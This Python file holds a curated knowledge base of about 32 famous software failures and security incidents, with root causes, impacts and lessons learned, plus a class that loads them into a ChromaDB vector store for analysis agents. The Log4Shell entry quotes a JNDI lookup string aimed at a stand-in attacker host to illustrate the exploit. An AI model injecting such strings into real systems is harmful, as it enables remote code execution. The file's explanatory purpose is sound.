"""
Famous Bugs Knowledge Base Loader

Curated collection of ~30+ famous software bugs, outages, and security incidents.
Used to provide historical context to agents during code analysis.
"""

from typing import Dict, List, Optional, Any
from datetime import datetime


FAMOUS_BUGS_DATA: List[Dict[str, Any]] = [
    # === CATEGORY: problems ===
    {
        "bug_id": "FB-001",
        "title": "Ariane 5 Flight 501 Explosion",
        "description": "The Ariane 5 rocket self-destructed 37 seconds after launch due to a software error. A 64-bit floating point number was converted to a 16-bit signed integer, causing an overflow.",
        "category": "problems",
        "year": 1996,
        "impact": "Rocket and payload worth $370 million destroyed. One of the most expensive software bugs in history.",
        "root_cause": "Integer overflow during type conversion. The inertial reference system reused Ariane 4 software without adequate testing for Ariane 5's different flight trajectory.",
        "lessons_learned": "Always validate data type conversions. Reused software must be retested in new contexts. Exception handling should not cause system shutdown in critical paths.",
        "cwe_ids": ["CWE-190", "CWE-681"],
        "technologies": ["Ada", "embedded systems"],
    },
    {
        "bug_id": "FB-002",
        "title": "Therac-25 Radiation Overdoses",
        "description": "The Therac-25 radiation therapy machine delivered lethal radiation doses to patients due to a race condition in its control software.",
        "category": "problems",
        "year": 1986,
        "impact": "At least 6 patients received massive overdoses, causing death or serious injury. Led to major reforms in medical device software regulation.",
        "root_cause": "Race condition between the operator interface and the beam control system. Removal of hardware safety interlocks that were present in earlier models.",
        "lessons_learned": "Never rely solely on software for safety-critical interlocks. Race conditions in concurrent systems can have fatal consequences. Independent safety review is essential for medical devices.",
        "cwe_ids": ["CWE-362", "CWE-636"],
        "technologies": ["assembly", "real-time systems"],
    },
    {
        "bug_id": "FB-003",
        "title": "Y2K Bug",
        "description": "The Year 2000 problem arose because many computer systems stored years as two-digit numbers, potentially interpreting 2000 as 1900.",
        "category": "problems",
        "year": 2000,
        "impact": "Estimated $300-600 billion spent globally on remediation. Demonstrated the long-term cost of short-sighted design decisions.",
        "root_cause": "Two-digit year representation in date fields to save memory, a reasonable choice in the 1960s-70s that became a major liability decades later.",
        "lessons_learned": "Design for longevity. Short-term optimizations can create massive technical debt. Date handling requires careful consideration of range and format.",
        "cwe_ids": ["CWE-170"],
        "technologies": ["COBOL", "mainframe", "embedded systems"],
    },
    {
        "bug_id": "FB-004",
        "title": "Knight Capital Trading Glitch",
        "description": "Knight Capital Group lost $440 million in 45 minutes due to a software deployment error that activated obsolete trading code.",
        "category": "problems",
        "year": 2012,
        "impact": "$440 million loss in 45 minutes. Company required emergency investment and was eventually acquired. One of the largest trading losses from a software bug.",
        "root_cause": "A technician failed to deploy new code to one of eight servers. The old code on that server used a repurposed flag that now triggered unintended rapid trading.",
        "lessons_learned": "Automated deployment must be atomic and verified. Dead code should be removed, not repurposed. Feature flags need proper lifecycle management. Kill switches are essential for trading systems.",
        "cwe_ids": ["CWE-561", "CWE-665"],
        "technologies": ["Java", "trading systems"],
    },
    {
        "bug_id": "FB-005",
        "title": "Mars Climate Orbiter Crash",
        "description": "NASA's Mars Climate Orbiter was lost because one team used metric units while another used imperial units for thrust calculations.",
        "category": "problems",
        "year": 1999,
        "impact": "$327.6 million mission lost. The spacecraft entered the Martian atmosphere at too low an altitude and was destroyed.",
        "root_cause": "Unit mismatch between teams. Lockheed Martin provided thrust data in pound-force seconds, but NASA's Jet Propulsion Laboratory expected newton-seconds.",
        "lessons_learned": "Establish clear interface contracts between teams. Unit testing should verify physical units, not just numerical values. Integration testing across team boundaries is critical.",
        "cwe_ids": ["CWE-474"],
        "technologies": ["C", "Fortran", "spacecraft systems"],
    },
    {
        "bug_id": "FB-006",
        "title": "Pentium FDIV Bug",
        "description": "Intel's Pentium processor had a flaw in the floating-point division unit that produced incorrect results for specific dividend/divisor pairs.",
        "category": "problems",
        "year": 1994,
        "impact": "Intel took a $475 million charge for chip replacements. Major PR crisis and loss of consumer trust.",
        "root_cause": "Five entries were missing from a lookup table used in the SRT division algorithm, causing errors in the fourth significant digit for certain calculations.",
        "lessons_learned": "Exhaustive testing of mathematical operations is essential. Transparency in handling defects is critical for brand trust. Hardware bugs are far more expensive to fix than software bugs.",
        "cwe_ids": ["CWE-682"],
        "technologies": ["hardware", "x86"],
    },
    {
        "bug_id": "FB-007",
        "title": "Toyota Unintended Acceleration",
        "description": "Multiple Toyota vehicle models experienced unintended acceleration events, linked to software issues in the electronic throttle control system.",
        "category": "problems",
        "year": 2009,
        "impact": "89 deaths reported. Toyota recalled 9 million vehicles and paid $1.2 billion in criminal penalties plus additional civil settlements.",
        "root_cause": "Spaghetti code with 10,000+ global variables, no MISRA-C compliance, inadequate stack overflow protection, and single-point-of-failure architecture.",
        "lessons_learned": "Safety-critical systems require formal verification. Coding standards like MISRA-C exist for a reason. Redundancy and watchdog systems are essential in automotive software.",
        "cwe_ids": ["CWE-121", "CWE-676"],
        "technologies": ["C", "embedded systems", "RTOS"],
    },
    {
        "bug_id": "FB-008",
        "title": "Boeing 737 MAX MCAS",
        "description": "The Maneuvering Characteristics Augmentation System (MCAS) in Boeing 737 MAX relied on a single angle-of-attack sensor and could override pilot inputs.",
        "category": "problems",
        "year": 2019,
        "impact": "346 deaths in two crashes (Lion Air 610 and Ethiopian Airlines 302). Worldwide fleet grounding for nearly two years.",
        "root_cause": "Single point of failure: MCAS relied on one AoA sensor without cross-checking. Inadequate pilot training on the new system. Software could repeatedly push the nose down.",
        "lessons_learned": "Safety-critical systems must never have single points of failure. Sensor fusion requires redundancy. Human factors and training are part of the system design.",
        "cwe_ids": ["CWE-636", "CWE-754"],
        "technologies": ["embedded systems", "avionics"],
    },
    # === CATEGORY: outages ===
    {
        "bug_id": "FB-009",
        "title": "AWS S3 Outage 2017",
        "description": "An engineer accidentally removed more servers than intended from the S3 billing system during a routine debugging exercise, causing a cascading failure across US-EAST-1.",
        "category": "outages",
        "year": 2017,
        "impact": "4-hour outage affecting thousands of websites and services including Apple, Netflix, Airbnb, and many others dependent on S3.",
        "root_cause": "Human error amplified by tooling that accepted unchecked input. The subsystem removal cascaded because S3's internal systems also depended on S3.",
        "lessons_learned": "Implement guardrails against large-scale changes. Rate-limit destructive operations. Avoid circular dependencies in infrastructure. Dashboard and monitoring systems should not depend on the systems they monitor.",
        "cwe_ids": ["CWE-754"],
        "technologies": ["cloud infrastructure", "distributed systems"],
    },
    {
        "bug_id": "FB-010",
        "title": "Facebook Global Outage 2021",
        "description": "Facebook, Instagram, WhatsApp, and Messenger went down globally for approximately 6 hours due to a BGP routing configuration change.",
        "category": "outages",
        "year": 2021,
        "impact": "6-hour global outage affecting 3.5 billion users. Estimated $100 million revenue loss. Engineers physically locked out of data centers.",
        "root_cause": "A configuration change to backbone routers inadvertently disconnected Facebook's data centers from the internet. The audit tool that should have caught the error had a bug.",
        "lessons_learned": "Out-of-band access to infrastructure is critical. Configuration changes need progressive rollout. Audit tools must be independently tested. DNS and BGP changes can cascade rapidly.",
        "cwe_ids": ["CWE-16"],
        "technologies": ["BGP", "DNS", "network infrastructure"],
    },
    {
        "bug_id": "FB-011",
        "title": "GitHub Universe DDoS 2018",
        "description": "GitHub was hit by the largest DDoS attack recorded at the time, peaking at 1.35 Tbps using memcached amplification.",
        "category": "outages",
        "year": 2018,
        "impact": "GitHub was offline for approximately 10 minutes before mitigation kicked in. Highlighted the risk of memcached amplification attacks.",
        "root_cause": "Attackers exploited publicly accessible memcached servers to amplify UDP traffic by a factor of 51,000x directed at GitHub's infrastructure.",
        "lessons_learned": "Never expose memcached to the public internet. UDP-based services need rate limiting. DDoS mitigation services should be pre-configured, not set up during an attack.",
        "cwe_ids": ["CWE-406"],
        "technologies": ["memcached", "UDP", "network"],
    },
    {
        "bug_id": "FB-012",
        "title": "Cloudflare Outage 2019",
        "description": "A bad regex in a WAF rule caused CPU exhaustion across Cloudflare's entire network, taking down millions of websites for 27 minutes.",
        "category": "outages",
        "year": 2019,
        "impact": "27-minute global outage affecting millions of websites. Cloudflare proxies roughly 10% of all internet traffic.",
        "root_cause": "A regular expression with catastrophic backtracking: (?:(?:\\\"[^\\\"]*\\\")|[^,])+ caused CPU to spike to 100% on every edge server simultaneously.",
        "lessons_learned": "Regular expressions need formal review and testing for backtracking. WAF rule deployments need canary releases. A single bad regex can take down global infrastructure.",
        "cwe_ids": ["CWE-1333", "CWE-400"],
        "technologies": ["Lua", "nginx", "regex"],
    },
    {
        "bug_id": "FB-013",
        "title": "Fastly CDN Outage 2021",
        "description": "A single customer configuration change triggered a latent bug in Fastly's software, causing 85% of their network to return 503 errors.",
        "category": "outages",
        "year": 2021,
        "impact": "1-hour outage affecting major websites including Amazon, Reddit, The New York Times, UK government sites, and many others.",
        "root_cause": "A software bug deployed weeks earlier was triggered by a specific valid customer configuration. The bug had not been detected because the triggering condition was unusual.",
        "lessons_learned": "Latent bugs can be triggered by valid inputs at any time. Canary deployments and feature flags reduce blast radius. CDN providers are critical single points of failure for the internet.",
        "cwe_ids": ["CWE-754"],
        "technologies": ["CDN", "VCL", "distributed systems"],
    },
    {
        "bug_id": "FB-014",
        "title": "CrowdStrike Global IT Outage 2024",
        "description": "A faulty content update to CrowdStrike Falcon sensor caused Windows systems worldwide to crash with Blue Screen of Death, affecting airlines, hospitals, banks, and government agencies.",
        "category": "outages",
        "year": 2024,
        "impact": "Estimated 8.5 million Windows devices affected worldwide. Airlines grounded flights, hospitals canceled surgeries, banks halted operations. Estimated $5.4 billion in direct losses for Fortune 500 companies.",
        "root_cause": "A content configuration update (Channel File 291) contained a logic error that caused an out-of-bounds memory read in the kernel-level sensor driver, triggering BSoD on boot.",
        "lessons_learned": "Kernel-level software updates need staged rollouts. Content updates should be tested as rigorously as code updates. Automated rollback mechanisms are essential. Single-vendor dependency creates systemic risk.",
        "cwe_ids": ["CWE-125", "CWE-787"],
        "technologies": ["Windows", "kernel drivers", "EDR"],
    },
    # === CATEGORY: bugs ===
    {
        "bug_id": "FB-015",
        "title": "OpenSSL Heartbleed",
        "description": "A missing bounds check in OpenSSL's TLS heartbeat extension allowed attackers to read server memory, potentially exposing private keys, passwords, and session data.",
        "category": "bugs",
        "year": 2014,
        "impact": "Affected an estimated 17% of all SSL web servers (about 500,000 servers). Required mass certificate reissuance and password resets across the internet.",
        "root_cause": "A missing bounds check in the heartbeat response handler (dtls1_process_heartbeat). The server would return as many bytes as the client requested, regardless of actual payload size.",
        "lessons_learned": "Always validate input lengths against actual data. Memory-safe languages prevent this class of bug. Critical infrastructure code needs more review and fuzzing. A single missing bounds check can compromise millions of systems.",
        "cwe_ids": ["CWE-126", "CWE-125"],
        "technologies": ["C", "OpenSSL", "TLS"],
    },
    {
        "bug_id": "FB-016",
        "title": "Log4Shell (Log4j)",
        "description": "A critical remote code execution vulnerability in Apache Log4j2 allowed attackers to execute arbitrary code by injecting JNDI lookup strings into logged data.",
        "category": "bugs",
        "year": 2021,
        "impact": "CVSS 10.0. Affected virtually every Java application using Log4j2. Exploited within hours of disclosure. Called 'the single biggest, most critical vulnerability ever' by CISA.",
        "root_cause": "Log4j2's message lookup substitution feature would process JNDI references in logged strings, allowing attackers to trigger remote class loading via ${jndi:ldap://evil.com/exploit}.",
        "lessons_learned": "Log processing should never execute code. JNDI lookups in user-controllable input are dangerous. SBOM (Software Bill of Materials) is essential for rapid vulnerability response. Transitive dependencies create hidden attack surfaces.",
        "cwe_ids": ["CWE-917", "CWE-502", "CWE-400"],
        "technologies": ["Java", "Log4j", "JNDI"],
    },
    {
        "bug_id": "FB-017",
        "title": "Shellshock (Bash)",
        "description": "A family of vulnerabilities in GNU Bash allowed remote code execution through specially crafted environment variables, exploitable via CGI scripts, DHCP clients, and other vectors.",
        "category": "bugs",
        "year": 2014,
        "impact": "Affected millions of Linux/Unix systems worldwide. The bug had existed undetected for 25 years. Actively exploited within hours of disclosure.",
        "root_cause": "Bash continued parsing function definitions in environment variables beyond the closing brace, executing trailing commands. The parser did not properly terminate after the function body.",
        "lessons_learned": "Environment variables should never be treated as code. Long-lived code accumulates hidden vulnerabilities. Parsing is a common source of security bugs. Defense in depth: minimize the attack surface of exposed interpreters.",
        "cwe_ids": ["CWE-78", "CWE-94"],
        "technologies": ["Bash", "CGI", "Linux"],
    },
    {
        "bug_id": "FB-018",
        "title": "Stagefright (Android)",
        "description": "Multiple vulnerabilities in Android's Stagefright media library allowed remote code execution via a specially crafted MMS message, requiring no user interaction.",
        "category": "bugs",
        "year": 2015,
        "impact": "Affected approximately 950 million Android devices (95% of all Android devices at the time). Led to Google establishing monthly Android security patches.",
        "root_cause": "Integer overflows in the MPEG4 and MP3 parsing code of the native media framework, leading to heap buffer overflows and arbitrary code execution.",
        "lessons_learned": "Media parsers are high-risk attack surfaces. Memory-safe languages should be used for parsing untrusted input. Automatic media processing of untrusted content is dangerous. Regular security patching cadence is essential.",
        "cwe_ids": ["CWE-190", "CWE-122"],
        "technologies": ["C++", "Android", "media parsing"],
    },
    {
        "bug_id": "FB-019",
        "title": "Spectre and Meltdown",
        "description": "Speculative execution side-channel vulnerabilities in modern CPUs allowed unprivileged processes to read kernel memory and memory from other processes.",
        "category": "bugs",
        "year": 2018,
        "impact": "Affected virtually all modern processors from Intel, AMD, and ARM. Required OS-level patches with measurable performance impact (2-30% depending on workload).",
        "root_cause": "CPUs speculatively execute instructions and leave measurable side effects in cache state. By measuring cache timing, attackers can infer the contents of memory they should not be able to access.",
        "lessons_learned": "Hardware optimizations can create security vulnerabilities. Side-channel attacks are practical. Performance and security are often in tension. Some classes of bugs require both hardware and software mitigations.",
        "cwe_ids": ["CWE-203", "CWE-200"],
        "technologies": ["hardware", "x86", "ARM", "OS kernel"],
    },
    {
        "bug_id": "FB-020",
        "title": "EternalBlue (WannaCry)",
        "description": "An NSA-developed exploit for a vulnerability in Windows SMB was leaked and used in the WannaCry ransomware attack, encrypting hundreds of thousands of computers worldwide.",
        "category": "bugs",
        "year": 2017,
        "impact": "WannaCry infected over 200,000 computers in 150 countries. UK's NHS was severely disrupted. Estimated global damage of $4-8 billion.",
        "root_cause": "A buffer overflow in Windows' SMBv1 implementation (MS17-010) allowed remote code execution. The vulnerability existed in all Windows versions. The patch was available but many systems were unpatched.",
        "lessons_learned": "Patch management is critical. Legacy protocols (SMBv1) should be disabled. Stockpiling exploits creates risk for everyone. Air-gapped networks are not immune if any connected device is compromised.",
        "cwe_ids": ["CWE-120", "CWE-362"],
        "technologies": ["Windows", "SMB", "network"],
    },
    # === CATEGORY: worms ===
    {
        "bug_id": "FB-021",
        "title": "Morris Worm",
        "description": "The first major worm on the internet, created by Robert Tappan Morris. It exploited vulnerabilities in Unix sendmail, fingerd, and rsh/rexec to spread across the early internet.",
        "category": "worms",
        "year": 1988,
        "impact": "Infected approximately 6,000 computers (10% of the internet at the time). Caused $100,000-$10,000,000 in damages. Led to the creation of CERT/CC.",
        "root_cause": "Buffer overflow in fingerd, a backdoor in sendmail's DEBUG mode, and predictable password attacks on rsh. The worm's reinfection mechanism caused denial-of-service by consuming all system resources.",
        "lessons_learned": "Buffer overflows are exploitable. Input validation is essential in network-facing services. A bug in the reinfection check (1/7 chance of reinfecting) turned a curiosity into a disaster. This led to the first computer crime prosecution.",
        "cwe_ids": ["CWE-120", "CWE-798"],
        "technologies": ["C", "Unix", "sendmail", "fingerd"],
    },
    {
        "bug_id": "FB-022",
        "title": "Stuxnet",
        "description": "A sophisticated state-sponsored worm targeting Iranian nuclear centrifuges. It exploited four zero-day Windows vulnerabilities and Siemens PLC software to cause physical damage.",
        "category": "worms",
        "year": 2010,
        "impact": "Destroyed approximately 1,000 uranium enrichment centrifuges at Iran's Natanz facility. First known cyberweapon to cause physical damage to industrial equipment.",
        "root_cause": "Four Windows zero-days for propagation, hardcoded Siemens default passwords, and manipulation of PLC frequency converter commands to spin centrifuges at destructive speeds while reporting normal operation.",
        "lessons_learned": "Air-gapped networks can be compromised (via USB). Default passwords in industrial systems are dangerous. SCADA/ICS systems need security-by-design. Nation-state threats require defense-in-depth.",
        "cwe_ids": ["CWE-798", "CWE-693"],
        "technologies": ["Windows", "Siemens PLC", "SCADA"],
    },
    {
        "bug_id": "FB-023",
        "title": "SQL Slammer Worm",
        "description": "A worm that exploited a buffer overflow in Microsoft SQL Server 2000, spreading so fast it doubled in size every 8.5 seconds and infected 75,000 hosts in 10 minutes.",
        "category": "worms",
        "year": 2003,
        "impact": "Caused widespread internet slowdowns. Knocked South Korea offline. Disrupted ATMs, airline reservation systems, and 911 emergency services. All from a 376-byte UDP packet.",
        "root_cause": "Buffer overflow in SQL Server's Resolution Service (UDP port 1434). The entire worm payload fit in a single UDP packet, enabling massive propagation speed without TCP handshake overhead.",
        "lessons_learned": "Minimize attack surface: disable unnecessary services. UDP-based services are particularly dangerous for worm propagation. Patching alone is insufficient without reducing exposed services.",
        "cwe_ids": ["CWE-120", "CWE-119"],
        "technologies": ["SQL Server", "UDP", "Windows"],
    },
    # === CATEGORY: ai ===
    {
        "bug_id": "FB-024",
        "title": "Amazon AI Recruiting Tool Bias",
        "description": "Amazon's AI recruiting tool systematically downgraded resumes from women because it was trained on historical hiring data that reflected gender bias in the tech industry.",
        "category": "ai",
        "year": 2018,
        "impact": "Project was scrapped after it was found to penalize resumes containing the word 'women's' and graduates of all-women's colleges. Highlighted systemic bias in AI systems.",
        "root_cause": "Training data reflected 10 years of male-dominated hiring patterns. The model learned to associate male-correlated features with successful hires, perpetuating historical bias.",
        "lessons_learned": "AI systems inherit biases from training data. Fairness metrics must be part of model evaluation. Human oversight is essential for high-stakes AI decisions. Historical data is not always a good predictor of desired outcomes.",
        "cwe_ids": ["CWE-1039"],
        "technologies": ["machine learning", "NLP"],
    },
    {
        "bug_id": "FB-025",
        "title": "Tesla Autopilot Phantom Braking",
        "description": "Tesla vehicles using vision-only Autopilot experienced sudden, unexpected braking events ('phantom braking') triggered by shadows, overpasses, and road markings misinterpreted as obstacles.",
        "category": "ai",
        "year": 2022,
        "impact": "NHTSA received over 750 complaints. Multiple rear-end collisions caused. Tesla recalled 362,000 vehicles for Full Self-Driving software updates.",
        "root_cause": "Computer vision system without radar backup misinterpreted visual patterns (shadows, overpasses) as physical obstacles requiring emergency braking. Lack of sensor fusion after radar removal.",
        "lessons_learned": "Sensor fusion provides redundancy against single-sensor failures. Safety-critical AI decisions need multiple confirmation signals. Removing hardware sensors increases software burden. Edge cases in perception systems can cause dangerous behavior.",
        "cwe_ids": ["CWE-697"],
        "technologies": ["computer vision", "neural networks", "autonomous driving"],
    },
    {
        "bug_id": "FB-026",
        "title": "Microsoft Tay Chatbot",
        "description": "Microsoft's AI chatbot Tay was designed to learn from Twitter interactions. Within 16 hours, it was manipulated into posting inflammatory and offensive content.",
        "category": "ai",
        "year": 2016,
        "impact": "Tay was taken offline within 16 hours of launch. Major PR embarrassment for Microsoft. Became a cautionary tale for AI safety and alignment.",
        "root_cause": "The chatbot learned from user interactions without content filtering or safety guardrails. Coordinated trolling campaigns deliberately taught it offensive responses through 'repeat after me' functionality.",
        "lessons_learned": "AI systems interacting with the public need content filtering. Adversarial users will attempt to manipulate AI behavior. Learning from unfiltered user input is dangerous. Safety guardrails must be designed before deployment.",
        "cwe_ids": ["CWE-20"],
        "technologies": ["NLP", "chatbot", "machine learning"],
    },
    # === Additional famous bugs ===
    {
        "bug_id": "FB-027",
        "title": "Equifax Data Breach",
        "description": "Personal data of 147 million people exposed through an unpatched Apache Struts vulnerability (CVE-2017-5638) that had a patch available for two months before exploitation.",
        "category": "bugs",
        "year": 2017,
        "impact": "147 million records exposed including SSNs, birth dates, addresses. $700 million settlement. CEO, CTO, and CISO resigned.",
        "root_cause": "Failure to patch a known critical vulnerability (Apache Struts CVE-2017-5638) within the organization's 48-hour SLA. Expired SSL certificates on intrusion detection systems prevented breach detection for 76 days.",
        "lessons_learned": "Patch management SLAs must be enforced. SSL certificate management is operational security. Monitoring systems must themselves be monitored. Supply chain dependencies require active management.",
        "cwe_ids": ["CWE-502", "CWE-295"],
        "technologies": ["Java", "Apache Struts", "web application"],
    },
    {
        "bug_id": "FB-028",
        "title": "SolarWinds Supply Chain Attack",
        "description": "Attackers compromised SolarWinds' build system and injected a backdoor (SUNBURST) into Orion software updates, distributed to 18,000 organizations including US government agencies.",
        "category": "bugs",
        "year": 2020,
        "impact": "18,000 organizations installed trojanized updates. US Treasury, Commerce, and Energy departments compromised. One of the most sophisticated supply chain attacks ever discovered.",
        "root_cause": "Attackers gained access to SolarWinds' build pipeline and injected malicious code that was signed and distributed as legitimate updates. Weak build server password ('solarwinds123').",
        "lessons_learned": "Build pipeline security is critical. Supply chain attacks can bypass all perimeter security. SBOM and build provenance are essential. Code signing without build integrity is security theater.",
        "cwe_ids": ["CWE-506", "CWE-798"],
        "technologies": [".NET", "C#", "build systems"],
    },
    {
        "bug_id": "FB-029",
        "title": "Apple goto fail Bug",
        "description": "A duplicated 'goto fail' statement in Apple's SSL/TLS implementation bypassed certificate chain validation, allowing man-in-the-middle attacks on all Apple devices.",
        "category": "bugs",
        "year": 2014,
        "impact": "All iOS and macOS devices were vulnerable to MITM attacks. Affected SSL/TLS certificate validation for months before discovery.",
        "root_cause": "A duplicated 'goto fail;' line caused the certificate verification function to always skip the signature check. The code lacked braces around conditional blocks, making the duplication non-obvious.",
        "lessons_learned": "Always use braces in conditional statements. Code review should catch duplicated lines. Static analysis tools can detect dead code after unconditional jumps. Critical security code needs extra scrutiny.",
        "cwe_ids": ["CWE-295", "CWE-561"],
        "technologies": ["C", "SSL/TLS", "iOS", "macOS"],
    },
    {
        "bug_id": "FB-030",
        "title": "Northeast Blackout 2003",
        "description": "A software bug in GE Energy's XA/21 alarm system failed to alert operators to a critical power line overload, contributing to the largest blackout in North American history.",
        "category": "outages",
        "year": 2003,
        "impact": "55 million people without power across northeastern US and Canada. $6 billion in economic losses. 11 deaths reported.",
        "root_cause": "A race condition in the alarm system caused it to stall, leaving operators unaware of cascading line failures. Combined with untrimmed trees touching a power line.",
        "lessons_learned": "Monitoring systems must be reliable above all else. Race conditions in alerting systems have outsized impact. Critical infrastructure needs redundant alerting paths. Software testing must include high-load scenarios.",
        "cwe_ids": ["CWE-362", "CWE-754"],
        "technologies": ["SCADA", "energy management"],
    },
    {
        "bug_id": "FB-031",
        "title": "British Post Office Horizon Scandal",
        "description": "Bugs in the Fujitsu Horizon accounting system incorrectly showed cash shortfalls at post office branches, leading to wrongful prosecution of over 900 sub-postmasters.",
        "category": "problems",
        "year": 2000,
        "impact": "Over 900 sub-postmasters wrongfully prosecuted between 1999-2015. Some imprisoned, many bankrupted, several committed suicide. Described as the most widespread miscarriage of justice in UK history.",
        "root_cause": "Software defects in the Horizon system caused phantom transactions and incorrect balances. Fujitsu and the Post Office denied bugs existed and blamed operators for 15+ years.",
        "lessons_learned": "Software systems can produce incorrect results that appear authoritative. Institutional trust in software over humans can cause injustice. Independent auditing of critical financial systems is essential. Cover-ups compound the damage.",
        "cwe_ids": ["CWE-682", "CWE-754"],
        "technologies": ["ICL/Fujitsu", "financial systems"],
    },
    {
        "bug_id": "FB-032",
        "title": "Uber Self-Driving Car Fatality",
        "description": "An Uber self-driving test vehicle struck and killed a pedestrian in Tempe, Arizona. The system detected her but classified her as a 'false positive' and did not brake.",
        "category": "ai",
        "year": 2018,
        "impact": "First pedestrian fatality involving a self-driving car. Uber suspended autonomous testing for 9 months. Led to increased regulatory scrutiny of autonomous vehicle testing.",
        "root_cause": "The perception system detected the pedestrian 6 seconds before impact but kept reclassifying her between 'vehicle', 'bicycle', and 'unknown'. The system was designed to suppress false positives, and emergency braking via Volvo's system had been disabled.",
        "lessons_learned": "Object classification instability indicates a system not ready for deployment. Disabling safety systems during testing is dangerous. Fail-safe behavior should default to caution. Safety drivers need engagement monitoring.",
        "cwe_ids": ["CWE-697", "CWE-636"],
        "technologies": ["LIDAR", "computer vision", "autonomous driving"],
    },
]


class FamousBugsLoader:
    """Loads famous bugs data into ChromaDB for vector search."""

    COLLECTION_NAME = "famous_bugs"

    def __init__(self, chroma_service):
        self.chroma_service = chroma_service

    def load_all(self) -> Dict[str, Any]:
        """Load all famous bugs into ChromaDB. Returns stats."""
        loaded = 0
        errors = []
        categories = {}

        for bug in FAMOUS_BUGS_DATA:
            try:
                self.load_bug(bug)
                loaded += 1
                cat = bug["category"]
                categories[cat] = categories.get(cat, 0) + 1
            except Exception as e:
                errors.append({"bug_id": bug["bug_id"], "error": str(e)})

        return {
            "loaded": loaded,
            "errors": len(errors),
            "error_details": errors,
            "categories": categories,
            "total_available": len(FAMOUS_BUGS_DATA),
        }

    def load_bug(self, bug_data: Dict[str, Any]) -> str:
        """Load a single bug into ChromaDB. Returns the bug_id."""
        # Build document text for embedding
        doc_text = (
            f"{bug_data['title']} ({bug_data['year']})\n"
            f"Category: {bug_data['category']}\n"
            f"Description: {bug_data['description']}\n"
            f"Root Cause: {bug_data['root_cause']}\n"
            f"Impact: {bug_data['impact']}\n"
            f"Lessons Learned: {bug_data['lessons_learned']}\n"
            f"CWEs: {', '.join(bug_data['cwe_ids'])}\n"
            f"Technologies: {', '.join(bug_data['technologies'])}"
        )

        metadata = {
            "bug_id": bug_data["bug_id"],
            "title": bug_data["title"],
            "category": bug_data["category"],
            "year": bug_data["year"],
            "cwe_ids": ",".join(bug_data["cwe_ids"]),
            "technologies": ",".join(bug_data["technologies"]),
            "source": "famous_bugs",
        }

        self.chroma_service.add_document(
            collection_name=self.COLLECTION_NAME,
            document_id=bug_data["bug_id"],
            text=doc_text,
            metadata=metadata,
        )

        return bug_data["bug_id"]

    def get_load_status(self) -> Dict[str, Any]:
        """Get current load status of the collection."""
        try:
            count = self.chroma_service.get_collection_count(self.COLLECTION_NAME)
        except Exception:
            count = 0

        categories = {}
        for bug in FAMOUS_BUGS_DATA:
            cat = bug["category"]
            categories[cat] = categories.get(cat, 0) + 1

        return {
            "collection": self.COLLECTION_NAME,
            "loaded_count": count,
            "available_count": len(FAMOUS_BUGS_DATA),
            "categories": categories,
        }

    def clear_collection(self) -> None:
        """Clear the famous bugs collection."""
        self.chroma_service.delete_collection(self.COLLECTION_NAME)
